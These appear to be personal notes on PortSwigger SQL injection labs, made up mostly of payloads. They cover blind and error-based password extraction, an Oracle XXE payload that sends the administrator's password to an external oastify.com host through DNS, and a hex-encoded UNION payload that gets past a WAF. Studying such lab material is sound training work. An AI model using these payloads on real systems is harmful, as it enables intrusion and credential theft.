# SQL Injection

[SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Lab: Blind SQL injection with conditional errors

    SELECT * FROM tracking WHERE id = ''||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

### LAB: Visible error-based SQL injection
This payload will output an error indicating that the password is not of type integer:

    SELECT * FROM tracking WHERE id = '' and 1=cast((select password from users limit 1) as int)--

### LAB: Blind SQL injection with out-of-band interaction
Use the payload in the DNS lookup section for Oracle. The database query now should look like this:

    SELECT * FROM tracking WHERE id = 'x' 
    UNION 
    SELECT EXTRACTVALUE(
        xmltype('<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE root [
                    <!ENTITY % remote SYSTEM "http://0jkn3s1omf3prbf85pphzy5xroxfl69v.oastify.com/"> 
                    %remote;
                ]>'),
        '/l'
    ) FROM dual--

This will cause a DNS lookup to our server.

### LAB: Blind SQL injection with out-of-band data exfiltration
Same as above lab but now include a subquery to steal the administrator's password. The database query now should look like this:

    SELECT * FROM tracking WHERE id = 'x' 
    UNION 
    SELECT EXTRACTVALUE(
        xmltype('<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE root [
                    <!ENTITY % remote SYSTEM 
                    "http://'||(SELECT password FROM users WHERE username='administrator')||'.0jkn3s1omf3prbf85pphzy5xroxfl69v.oastify.com/"> 
                    %remote;
                ]>'),
        '/l'
    ) FROM dual--

This will cause a DNS lookup to our server containing the administrator's password in the subdomain.

### Lab: SQL injection with filter bypass via XML encoding
Use Hackvertor with hex encoding to bypass WAF:

    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            <@hex_entities>
                1 UNION SELECT username || '~' || password from users
            </@hex_entities>
        </storeId>
    </stockCheck>